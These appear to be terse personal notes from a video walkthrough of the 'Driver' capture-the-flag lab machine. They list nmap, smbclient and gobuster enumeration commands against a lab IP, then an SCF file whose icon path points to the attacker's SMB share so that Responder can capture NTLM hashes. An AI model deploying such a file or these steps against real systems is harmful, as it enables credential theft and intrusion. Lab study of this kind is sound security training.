https://www.youtube.com/watch?v=N2ahkarb-zI&list=PLidcsTyj9JXL4Jv6u9qi8TcUgsNoKKHNn

## nmap scan

sudo nmap -sC -sV -oA nmap/driver 10.10.11.106

port 80, 135

## smbclient

smbclient -L //10.10.11.106 - default

smbclient -N -L //10.10.11.106 - no password

smbclient -U '' -L //10.10.11.106

smbclient -U '.' -L //10.10.11.106

cme smb 10.10.11.106

# looking at website

admin 
admin

notice - url ends at .php

gobuster dir -u http://10.10.11.10 -U admin -P admin -x php -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -o gobuster.out

# creaitng an scf file

vi attack.scf
```
[Shell]
Command=2
IconFile=10.10.6.12\share\anything_here
[Taskbar]
Command=ToggleDesktop
```

need to use responder.

6.37




